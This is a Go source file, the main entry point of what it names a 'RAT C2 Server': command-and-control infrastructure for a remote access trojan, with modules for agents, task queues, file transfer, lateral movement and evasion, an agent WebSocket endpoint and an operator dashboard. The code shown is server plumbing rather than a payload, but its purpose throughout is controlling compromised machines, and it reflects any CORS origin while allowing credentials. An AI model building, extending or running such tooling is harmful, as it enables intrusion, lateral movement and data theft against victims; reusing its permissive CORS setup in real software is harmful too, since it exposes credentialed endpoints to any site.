package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/jmoiron/sqlx"
	_ "modernc.org/sqlite"
	"github.com/spf13/viper"

	"rat-c2-server/internal/agent"
	"rat-c2-server/internal/api"
	"rat-c2-server/internal/config"
	"rat-c2-server/internal/db"
	"rat-c2-server/internal/evasion"
	"rat-c2-server/internal/filetransfer"
	"rat-c2-server/internal/lateral"
	"rat-c2-server/internal/task"
	"rat-c2-server/internal/ws"
)

var (
	version   = "dev"
	buildTime = "unknown"
	gitCommit = "unknown"
)

// buildTimeStamp is set at process start so every served index.html carries a
// unique cache-busting query on its asset URLs (forces a fresh bundle load).
var buildTimeStamp = time.Now().Unix()

// assetTagRegex matches the opening quote + /assets/ path inside src/href
// attributes so we can append ?v= while keeping the surrounding quotes intact.
var assetTagRegex = regexp.MustCompile(`="(/assets/[^"]+)"`)

type Server struct {
	config      *config.Config
	db          *sqlx.DB
	agentMgr    *agent.Manager
	taskQueue   *task.Queue
	fileMgr     *filetransfer.Manager
	lateralMgr  *lateral.Manager
	evasionMgr  *evasion.Manager
	wsHub       *ws.Hub
	apiServer   *http.Server
	wsServer    *http.Server
	mu          sync.RWMutex
	running     bool
}

func main() {
	cfg := config.Load()

	// Initialize database
	database, err := db.Init(cfg.Database.Path)
	if err != nil {
		log.Fatalf("Database init failed: %v", err)
	}
	defer database.Close()

	// Initialize managers
	agentMgr := agent.NewManager(database)
	taskQueue := task.NewQueue(database, agentMgr)
	fileMgr := filetransfer.NewManager(database, cfg.FileStorage.Path)
	lateralMgr := lateral.NewManager()
	evasionMgr := evasion.NewManager()
	evasionMgr.SetDB(database)
	evasionMgr.SetAgentManager(agentMgr)

	// WebSocket hub
	wsHub := ws.NewHub(agentMgr, taskQueue, fileMgr)
	go wsHub.Run()

	srv := &Server{
		config:     cfg,
		db:         database,
		agentMgr:   agentMgr,
		taskQueue:  taskQueue,
		fileMgr:    fileMgr,
		lateralMgr: lateralMgr,
		evasionMgr: evasionMgr,
		wsHub:      wsHub,
	}

	// Setup API server (REST + WebSocket)
	srv.setupAPIServer()

	// Setup WebSocket server (for agents)
	srv.setupWSServer()

	// Start background workers
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go srv.agentMgr.CleanupStale(ctx, 5*time.Minute)
	go srv.taskQueue.ProcessQueue(ctx)
	go srv.fileMgr.CleanupTemp(ctx, 1*time.Hour)

	// Print banner
	printBanner()

	// Start servers
	go func() {
		log.Printf("[*] API server listening on %s", cfg.Server.APIAddr)
		if cfg.Server.TLSEnabled {
			if err := srv.apiServer.ListenAndServeTLS(cfg.Server.TLSCert, cfg.Server.TLSKey); err != nil && err != http.ErrServerClosed {
				log.Printf("API TLS server error: %v", err)
			}
		} else {
			if err := srv.apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("API server error: %v", err)
			}
		}
	}()

	go func() {
		log.Printf("[*] Agent WebSocket server listening on %s", cfg.Server.WSAddr)
		if cfg.Server.TLSEnabled {
			if err := srv.wsServer.ListenAndServeTLS(cfg.Server.TLSCert, cfg.Server.TLSKey); err != nil && err != http.ErrServerClosed {
				log.Printf("WS TLS server error: %v", err)
			}
		} else {
			if err := srv.wsServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("WS server error: %v", err)
			}
		}
	}()

	// Wait for interrupt
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	log.Println("[*] Shutting down...")
	cancel()

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer shutdownCancel()

	srv.apiServer.Shutdown(shutdownCtx)
	srv.wsServer.Shutdown(shutdownCtx)

	log.Println("[*] Server stopped")
}

func (s *Server) setupAPIServer() {
	if !s.config.Server.Debug {
		gin.SetMode(gin.ReleaseMode)
	}

	r := gin.Default()

	// Cache policy: never cache index.html (so new builds always load),
	// allow long caching on content-hashed assets (they change name on rebuild).
	r.Use(func(c *gin.Context) {
		c.Header("Referrer-Policy", "no-referrer")
		if c.Request.URL.Path == "/" || c.Request.URL.Path == "/index.html" {
			c.Header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
			c.Header("Pragma", "no-cache")
			c.Header("Expires", "0")
		} else if len(c.Request.URL.Path) > 8 && c.Request.URL.Path[:8] == "/assets/" {
			c.Header("Cache-Control", "public, max-age=31536000, immutable")
		}
		c.Next()
	})

	// CORS — reflect the caller's origin so credentialed (Bearer) requests
	// from c2.local / 127.0.0.1 / thechoicervoicergames.com all work.
	// Wildcard "*" + AllowCredentials is rejected by browsers, so we mirror
	// the incoming Origin instead.
	r.Use(cors.New(cors.Config{
		AllowOriginFunc: func(origin string) bool {
			return true // reflect any origin; credentials still permitted
		},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "X-Requested-With"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	// Static files for web dashboard
	r.Static("/assets", "./web/dist/assets")
	// Serve index.html via handler so we can inject a cache-busting query
	// on the bundled asset URLs (guarantees a fresh load after every rebuild).
	serveIndex := func(c *gin.Context) {
		data, err := os.ReadFile("./web/dist/index.html")
		if err != nil {
			c.Status(http.StatusNotFound)
			return
		}
		// buildTime is a unix-second stamp; changes on each server restart,
		// which is enough to bust a cached HTML that points at an old bundle.
		v := strconv.FormatInt(buildTimeStamp, 10)
		html := assetTagRegex.ReplaceAll(data, []byte(`="$1?v=`+v+`"`))
		c.Data(http.StatusOK, "text/html; charset=utf-8", html)
	}
	r.GET("/", serveIndex)
	r.NoRoute(func(c *gin.Context) {
		if c.Request.Method == http.MethodGet && !strings.HasPrefix(c.Request.URL.Path, "/api") {
			serveIndex(c)
			return
		}
		c.JSON(http.StatusNotFound, gin.H{"error": "Not found"})
	})

	// API routes
	api.SetDB(s.db)
	api.RegisterRoutes(r, s.agentMgr, s.taskQueue, s.fileMgr, s.lateralMgr, s.evasionMgr, s.wsHub, s.config)

	s.apiServer = &http.Server{
		Addr:         s.config.Server.APIAddr,
		Handler:      r,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
}

func (s *Server) setupWSServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/agent", s.wsHub.HandleAgentWS)
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	})

	s.wsServer = &http.Server{
		Addr:         s.config.Server.WSAddr,
		Handler:      mux,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  300 * time.Second,
	}

	// Configure TLS if enabled
	if s.config.Server.TLSEnabled {
		s.setupTLS(s.wsServer)
		s.setupTLS(s.apiServer)
	}
}

func (s *Server) setupTLS(server *http.Server) {
	cert, err := tls.LoadX509KeyPair(s.config.Server.TLSCert, s.config.Server.TLSKey)
	if err != nil {
		log.Printf("TLS cert load failed: %v", err)
		return
	}

	// Optionally load CA for mTLS
	var clientCAs *x509.CertPool
	if s.config.Server.ClientCA != "" {
		clientCAs = x509.NewCertPool()
		caCert, err := os.ReadFile(s.config.Server.ClientCA)
		if err == nil {
			clientCAs.AppendCertsFromPEM(caCert)
		}
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	if clientCAs != nil {
		tlsConfig.ClientCAs = clientCAs
		tlsConfig.ClientAuth = tls.RequireAndVerifyClientCert
	}

	server.TLSConfig = tlsConfig
}

func printBanner() {
	fmt.Printf(`
╔══════════════════════════════════════════════════════════════════════════════╗
║                        RAT C2 Server v%s                                  ║
║                         Build: %s (%s)                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  API:      %s                                                               ║
║  Agent WS: %s                                                                ║
║  TLS:      %v                                                               ║
║  DB:       %s                                                               ║
╚══════════════════════════════════════════════════════════════════════════════╝
`, version, buildTime, gitCommit, "http://"+viper.GetString("server.api_addr"), "ws://"+viper.GetString("server.ws_addr"), viper.GetBool("server.tls_enabled"), viper.GetString("database.path"))
}